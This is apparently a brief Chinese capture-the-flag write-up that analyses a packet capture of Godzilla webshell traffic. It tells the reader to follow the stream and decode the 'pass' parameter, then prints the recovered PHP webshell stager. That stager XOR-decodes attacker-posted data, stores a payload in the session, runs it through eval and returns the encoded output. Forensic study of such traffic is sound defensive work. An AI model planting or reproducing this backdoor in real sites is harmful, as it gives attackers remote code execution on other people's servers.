这是哥斯拉websehll流量的抓包
目的是拿到flag
![image](https://github.com/user-attachments/assets/7a9a520c-89a6-411a-889d-d6b74675ceec)
选择追踪流
将pass解出来
  @session_start();
  @set_time_limit(0);
  @error_reporting(0);
  function encode($D,$K){
      for($i=0;$i<strlen($D);$i++) {
          $c = $K[$i+1&15];
          $D[$i] = $D[$i]^$c;
      }
      return $D;
  }
  $pass='key';
  $payloadName='payload';
  $key='3c6e0b8a9c15224a';
  if (isset($_POST[$pass])){
      $data=encode(base64_decode($_POST[$pass]),$key);
      if (isset($_SESSION[$payloadName])){
          $payload=encode($_SESSION[$payloadName],$key);
          if (strpos($payload,"getBasicsInfo")===false){
              $payload=encode($payload,$key);
          }
                  eval($payload);
          echo substr(md5($pass.$key),0,16);
          echo base64_encode(encode(@run($data),$key));
          echo substr(md5($pass.$key),16);
      }else{
          if (strpos($data,"getBasicsInfo")!==false){
              $_SESSION[$payloadName]=encode($data,$key);
          }
      }
  }
